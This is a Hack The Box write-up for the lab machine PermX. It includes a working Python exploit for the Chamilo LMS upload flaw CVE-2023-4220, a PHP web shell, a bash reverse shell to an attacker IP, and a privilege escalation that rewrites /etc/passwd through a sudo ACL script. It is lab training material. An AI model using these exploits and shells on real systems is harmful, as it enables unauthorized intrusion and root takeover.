---
layout: single
title: PermX  - Hack The Box
excerpt: "'PermX' is an Easy Difficulty Linux machine featuring a learning management system vulnerable to unrestricted file uploads via [CVE-2023-4220](https://nvd.nist.gov/vuln/detail/CVE-2023-4220). This vulnerability is leveraged to gain a foothold on the machine. Enumerating the machine reveals credentials that lead to SSH access. A 'sudo' misconfiguration is then exploited to gain a 'root' shell."
date: 2025-06-02
classes: wide
header:
  teaser: /img2/permx.PNG
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Linux
  - Easy
tags:
  - Subdomain Enumeration
  - Chamilo LMS Exploitation - Unauthenticated Command Injection [CVE-2023-4220] (RCE)
  - Information Leakage
  - Abusing Sudoers - Custom Bash Script (playing with setfacl) [Privilege Escalation]
---


## Reconnaissance

- Nmap 

```bash
nmap -sS --open -p- --min-rate 5000 -vvv -n -Pn 10.10.11.23
```

![](/img2/Pasted%20image%2020250602093054.png)

- Add domain to local DNS

```bash
echo "10.10.11.23 permx.htb" >> /etc/hosts
```

- Wfuzz to find subdomains

```bash
wfuzz -c -t 50 --hc=302 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.permx.htb" http://permx.htb/
```

![](/img2/Pasted%20image%2020250602094414.png)

- Add domains to local DNS

```bash
echo "10.10.11.23 www.permx.htb lms.permx.htb" >> /etc/hosts
```

- Whatweb

```bash
whatweb http://lms.permx.htb/
```

![](/img2/Pasted%20image%2020250602094727.png)

## Exploitation

- Chamilo Unauthenticated Command Injection (CVE-2023-4220)

```python
import requests
import argparse
from urllib.parse import urljoin

def upload_shell(target_url, payload_name):
    upload_url = urljoin(target_url, "main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported")
    shell_path = f"/main/inc/lib/javascript/bigupload/files/{payload_name}"
    shell_url = urljoin(target_url, shell_path)
    
    # Payload containing the PHP web shell
    files = {'bigUploadFile': (payload_name, '<?php system($_GET["cmd"]); ?>', 'application/x-php')}
    
    # Upload the payload
    response = requests.post(upload_url, files=files)
    
    if response.status_code == 200:
        print("[+] File uploaded successfully!")
        print(f"[+] Access the shell at: {shell_url}?cmd=")
    else:
        print("[-] File upload failed.")

def execute_command(shell_url, cmd):
    # Execute the command
    response = requests.get(f"{shell_url}?cmd={cmd}")
    if response.status_code == 200:
        print(f"[+] Command Output:\n{response.text}")
    else:
        print(f"[-] Failed to execute command at {shell_url}")

if __name__ == "__main__":
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description="CVE-2023-4220 Chamilo LMS Unauthenticated File Upload RCE Exploit")
    parser.add_argument('target_url', help="The target base URL of the Chamilo LMS instance (e.g., http://example.com/)")
    parser.add_argument('cmd', help="The command to execute on the remote server")
    parser.add_argument('--shell', default='rce.php', help="The name of the shell file to be uploaded (default: rce.php)")
    
    args = parser.parse_args()

    # Run the exploit with the provided arguments
    upload_shell(args.target_url, args.shell)
    
    # Form the shell URL to execute commands
    shell_url = urljoin(args.target_url, f"main/inc/lib/javascript/bigupload/files/{args.shell}")
    execute_command(shell_url, args.cmd)
```

```bash
python3 exploit.py http://lms.permx.htb/ id
```
![](/img2/Pasted%20image%2020250602104125.png)

- Manual explotation

```bash
echo '<?php system("id"); ?>' > rce.php
```

```bash
curl -F 'bigUploadFile=@rce.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
```

![](/img2/Pasted%20image%2020250602103932.png)

```bash
curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce.php'
```

![](/img2/Pasted%20image%2020250602104018.png)

- Send reverse shell

```bash
echo "<?php system(\"bash -c 'bash -i >& /dev/tcp/10.10.16.7/9000 0>&1'\"); ?>" > rce.php
```

```bash
curl -F 'bigUploadFile=@rce.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
```

![](/img2/Pasted%20image%2020250602103932.png)

```bash
curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce.php'
```

```bash
nc -nlvp 9000
```

## Post-exploitation 

- Find leaked credentials

```bash
cd /var/www/chamilo/app/config
```

```bash
cat * | grep password -C 2
```

![](/img2/Pasted%20image%2020250602105614.png)

- Pivoting 

```bash
su mtz
```

- Check sudoers

```bash
sudo -l
```

![](/img2/Pasted%20image%2020250602115919.png)

- Check bash file

![](/img2/Pasted%20image%2020250602120017.png)

> We only can change ACL perms in /home/mtz directory, without path traversal ".."

- Create sym link and change ACL perms

```bash
ln -s /etc/passwd etcpasswd
```

```bash
sudo /opt/acl.sh mtz rwx /home/mtz/etcpasswd
```

- Change root password in /etc/passwd

```bash
openssl passwd -1 root
```

![](/img2/Pasted%20image%2020250602120322.png)

![](/img2/Pasted%20image%2020250602120522.png)

```bash
su root
```


![](/img2/Pasted%20image%2020250602115818.png)